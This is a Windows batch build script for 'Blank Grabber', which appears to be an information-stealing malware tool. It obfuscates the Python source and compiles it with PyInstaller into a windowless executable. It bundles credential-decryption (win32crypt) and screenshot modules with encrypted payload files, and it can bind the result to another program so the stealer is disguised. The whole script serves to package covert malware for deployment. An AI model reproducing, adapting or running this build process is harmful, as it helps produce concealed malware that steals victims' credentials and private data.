@echo off
if not exist activate.bat exit
title Obfuscating...
python ooo.py
title Converting to exe...
if exist icon.ico (set icon=icon.ico) else (set icon=NONE)
if exist bound.exe (set bound=--add-data bound.exe;.) else (set bound= )
pyinstaller --onefile --noconsole --noconfirm main-o.py --name "Blank Grabber" -i %icon% --clean --hidden-import requests --hidden-import PIL.Image --hidden-import PIL.ImageGrab --hidden-import PIL.ImageStat --hidden-import pyaes --hidden-import win32crypt --hidden-import json --hidden-import urllib3 --add-data cm.bam.aes;. --add-data a.es;. --add-data config.json;. --add-data ck.bam.aes;. --add-data pm.bam.aes;. --key %random%%random%%random%5 --version-file version.txt %bound%
cls
title Opening Folder...
explorer.exe dist